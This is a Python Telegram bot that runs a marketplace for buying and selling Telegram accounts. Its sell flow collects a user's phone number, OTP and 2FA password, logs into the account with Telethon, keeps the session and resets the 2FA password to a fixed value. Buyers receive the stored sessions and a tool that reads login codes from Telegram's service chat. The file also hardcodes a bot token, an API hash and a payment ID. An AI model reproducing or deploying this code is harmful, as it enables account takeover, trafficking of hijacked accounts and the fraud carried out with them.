import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
import asyncio
import os
import threading
import re
import time
import json
import logging
from flask import Flask

# --- LOGGING FOR DEBUGGING ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- WEB SERVER FOR 24/7 UPTIME ---
app = Flask('')
@app.route('/')
def home(): return "<h1>TITAN CORE: 100% OPERATIONAL 🚀</h1>"
threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080), daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- 📂 POWERFUL JSON DATABASE ENGINE ---
DB_FILE = 'titan_final_v1.json'

def load_db():
    if not os.path.exists(DB_FILE):
        data = {
            'users': {}, 
            'admins': [OWNER_ID], 
            'upi': 'abhay-op.315@ptyes', 
            'stock': {}, 
            'sell_rates': {}, 
            'buy_rates': {},
            'stats': {'total_deals': 0, 'total_volume': 0}
        }
        with open(DB_FILE, 'w') as f: json.dump(data, f)
        return data
    with open(DB_FILE, 'r') as f: return json.load(f)

def save_db():
    with open(DB_FILE, 'w') as f: json.dump(db, f, indent=4)

db = load_db()
active_logins = {}
if not os.path.exists('sessions'): os.makedirs('sessions')

# --- ⌨️ CUSTOM KEYBOARDS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton('💰 BALANCE'), types.KeyboardButton('📥 DEPOSIT'),
        types.KeyboardButton('📤 SELL ID'), types.KeyboardButton('🛒 BUY ID'),
        types.KeyboardButton('📊 STATS'), types.KeyboardButton('📞 SUPPORT')
    )
    return markup

# --- 🚀 PRIORITY HANDLERS (FIXED MSG TRIGGER) ---
@bot.message_handler(commands=['start'])
def start_handler(m):
    uid = str(m.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {'bal': 0, 'bought': 0, 'sold': 0}
        save_db()
    bot.send_message(m.chat.id, "🔥 **TITAN MEGA ENGINE ONLINE**\n\n- Manual Deposit\n- Auto Selling System\n- Auto 2FA (2710)\n- Real-time Market", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def support_msg(m):
    mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "🆘 **Contact Support for any issues:**", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == '📊 STATS')
def stats_msg(m):
    u = db['users'].get(str(m.from_user.id), {'bal':0, 'bought':0, 'sold':0})
    text = (
        "📊 **YOUR STATISTICS**\n\n"
        f"💳 Balance: ₹{u['bal']}\n"
        f"🛒 IDs Bought: {u['bought']}\n"
        f"📤 IDs Sold: {u['sold']}"
    )
    bot.send_message(m.chat.id, text)

# --- 👑 POWERFUL ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_menu(m):
    if m.from_user.id not in db['admins']: return
    text = (
        "👑 **ADMIN CONTROL UNIT**\n\n"
        "📍 `/addcountry [NAME] [BUY] [SELL]`\n"
        "📍 `/addbal [USER_ID] [AMT]`\n"
        "📍 `/setupi [UPI_ID]`\n"
        "📍 `/broadcast [MSG]`\n"
        "📍 `/addstock` (Direct login to stock)"
    )
    bot.send_message(m.chat.id, text)

@bot.message_handler(commands=['addcountry'])
def adm_add_c(m):
    if m.from_user.id not in db['admins']: return
    try:
        args = m.text.split()
        name, b_p, s_p = args[1].upper(), int(args[2]), int(args[3])
        db['buy_rates'][name], db['sell_rates'][name] = b_p, s_p
        db['stock'].setdefault(name, [])
        save_db()
        bot.reply_to(m, f"✅ `{name}` category added successfully.")
    except: bot.reply_to(m, "❌ Format: `/addcountry INDIA 40 25`")

# --- 📥 DEPOSIT (MANUAL APPROVAL) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(m):
    msg = bot.send_message(m.chat.id, "💵 **Amount enter karein (₹):**")
    bot.register_next_step_handler(msg, dep_utr_step)

def dep_utr_step(m):
    if not m.text.isdigit(): return bot.send_message(m.chat.id, "❌ Valid number bhejein.")
    amt = m.text
    msg = bot.send_message(m.chat.id, f"💳 Pay to: `{db['upi']}`\n\nAb **12-digit UTR** bhejein:")
    bot.register_next_step_handler(msg, dep_ss_step, amt)

def dep_ss_step(m, amt):
    utr = m.text.strip()
    if len(utr) != 12: return bot.send_message(m.chat.id, "❌ UTR galat hai.")
    msg = bot.send_message(m.chat.id, "📸 **Payment Screenshot** bhejein:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(m, amt, utr):
    if m.content_type != 'photo': return bot.send_message(m.chat.id, "❌ Screenshot missing.")
    mk = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("✅ APPROVE", callback_data=f"ADM_DA_{m.from_user.id}_{amt}"),
        types.InlineKeyboardButton("❌ REJECT", callback_data=f"ADM_DR_{m.from_user.id}")
    )
    for a in db['admins']:
        bot.send_photo(a, m.photo[-1].file_id, caption=f"💰 DEPOSIT REQ\nUser: `{m.from_user.id}`\nAmt: ₹{amt}\nUTR: {utr}", reply_markup=mk)
    bot.send_message(m.chat.id, "⏳ Review pending from Admin.")

# --- 📤 FULL AUTO SELL ENGINE ---
@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_init(m):
    if not db['sell_rates']: return bot.send_message(m.chat.id, "❌ Selling market closed.")
    mk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: mk.add(f"SELL {c}")
    bot.send_message(m.chat.id, "🌍 **Kaunsi country ki ID hai?**", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_process_start(m):
    country = m.text.replace('SELL ', '')
    msg = bot.send_message(m.chat.id, f"📞 **{country}** ID bechne ke liye Number (+ format) bhejein:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=auto_login_worker, args=(m.chat.id, ms.text, country, "sell")).start())

def auto_login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    
    async def task():
        await client.connect()
        try:
            req = await client.send_code_request(phone)
            active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
            bot.send_message(chat_id, "📩 **OTP Bheja gaya hai.** Enter Code:")
            bot.register_next_step_handler_by_chat_id(chat_id, otp_receiver)
        except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")
    
    loop.run_until_complete(task())

def otp_receiver(m):
    d = active_logins.get(m.chat.id)
    async def verify():
        try:
            await d['client'].sign_in(d['phone'], m.text.strip(), phone_code_hash=d['hash'])
            await finalize_id(m, d)
        except SessionPasswordNeededError:
            bot.send_message(m.chat.id, "🔐 **2FA Password bhejein:**")
            bot.register_next_step_handler_by_chat_id(m.chat.id, pass_receiver)
        except: bot.send_message(m.chat.id, "❌ OTP Galat hai.")
    d['loop'].run_until_complete(verify())

def pass_receiver(m):
    d = active_logins.get(m.chat.id)
    async def verify():
        try:
            await d['client'].sign_in(password=m.text.strip())
            await finalize_id(m, d, m.text.strip())
        except: bot.send_message(m.chat.id, "❌ Password galat hai.")
    d['loop'].run_until_complete(verify())

async def finalize_id(m, d, pwd="None"):
    if d['mode'] == "sell":
        # AUTO 2FA CHANGE TO 2710
        try:
            await d['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="TITAN")
            ))
        except: pass
        
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"ADM_SA_{m.chat.id}_{d['country']}"))
        for a in db['admins']:
            bot.send_message(a, f"📦 **NEW SELL ID**\nNum: `{d['phone']}`\nCountry: {d['country']}\nPass: 2710", reply_markup=mk)
        bot.send_message(m.chat.id, "✅ **ID Logged in!** Admin verify karke balance add karega.")
    else:
        db['stock'].setdefault(d['country'], []).append(f"{d['phone']}:PASS:{pwd}")
        save_db()
        bot.send_message(m.chat.id, f"✅ Added to {d['country']} stock.")

# --- 🛒 AUTOMATIC MARKET ENGINE ---
@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_panel(m):
    if not db['buy_rates']: return bot.send_message(m.chat.id, "❌ Market Closed.")
    mk = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        stk = len(db['stock'].get(c, []))
        mk.add(types.InlineKeyboardButton(f"{c} | ₹{p} | Stk: {stk}", callback_data=f"BUYID_{c}"))
    bot.send_message(m.chat.id, "🛒 **MARKET RATES:**", reply_markup=mk)

# --- ⚙️ CALLBACK CALLBACK ROUTER ---
@bot.callback_query_handler(func=lambda call: True)
def cb_master(call):
    p = call.data.split('_')
    uid = str(call.from_user.id)

    if p[0] == 'ADM': # ADMIN APPROVALS
        target = p[2]
        if p[1] == 'DA': # Deposit
            db['users'][target]['bal'] += int(p[3])
            save_db(); bot.send_message(int(target), f"✅ ₹{p[3]} added to balance!")
            bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
        elif p[1] == 'SA': # Sell Approval
            rate = db['sell_rates'].get(p[3], 0)
            db['users'][target]['bal'] += rate
            db['users'][target]['sold'] += 1
            save_db(); bot.send_message(int(target), f"✅ ID for {p[3]} approved! ₹{rate} added.")
            bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)

    elif p[0] == 'BUYID': # USER BUYING
        c = p[1]
        price = db['buy_rates'].get(c, 0)
        if db['users'][uid]['bal'] < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "Low Stock/Balance!", show_alert=True)
        
        acc = db['stock'][c].pop(0)
        db['users'][uid]['bal'] -= price
        db['users'][uid]['bought'] += 1
        save_db()
        phone = acc.split(':')[0]
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("📩 GET OTP", callback_data=f"TOOL_OTP_{phone}"))
        bot.send_message(int(uid), f"🛒 **SUCCESS**\nData: `{acc}`\n2FA: 2710", reply_markup=mk)

    elif p[0] == 'TOOL':
        threading.Thread(target=auto_otp_worker, args=(call, p[2])).start()

def auto_otp_worker(call, phone):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        msgs = loop.run_until_complete(client.get_messages(777000, limit=1))
        code = re.search(r'\b(\d{5})\b', msgs[0].message) if msgs else None
        bot.send_message(call.from_user.id, f"📩 **OTP:** `{code.group(1) if code else 'Not found'}`")
    except: bot.send_message(call.from_user.id, "❌ Error fetching OTP.")
    finally: loop.run_until_complete(client.disconnect())

# --- USER TOOLS ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def check_bal(m):
    b = db['users'].get(str(m.from_user.id), {'bal': 0})['bal']
    bot.send_message(m.chat.id, f"💳 **Balance:** ₹{b}")

bot.polling(none_stop=True)
